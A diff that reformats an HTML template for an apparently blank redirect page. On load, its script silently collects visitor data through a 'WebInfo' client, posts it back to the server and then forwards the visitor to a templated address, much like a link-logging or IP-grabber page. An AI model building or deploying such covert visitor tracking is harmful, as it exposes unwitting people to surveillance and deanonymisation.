@@ -1,22 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script type="module">
-        import { WebInfo } from '/WebInfo-client.js';
-        (async function(){
-            var data = await WebInfo.getData();
-            var req = new XMLHttpRequest();
-            req.open('POST', window.location.href, true);
-            req.setRequestHeader('Content-Type', 'application/json');
-            req.send(JSON.stringify(data));
-            window.location.href = 'https://' + <<<REDIRECT>>>;
-        })();
+      import { WebInfo } from '/WebInfo-client.js';
+      (async function(){
+          const data = await WebInfo.getData();
+          let req = new XMLHttpRequest();
+          req.open('POST', window.location.href, true);
+          req.setRequestHeader('Content-Type', 'application/json');
+          req.send(JSON.stringify(data));
+          window.location.href = 'https://' + <<<REDIRECT>>>;
+      })();
     </script>
     <title></title>
-</head>
-<body>
-    
-</body>
+  </head>
+  <body></body>
 </html>
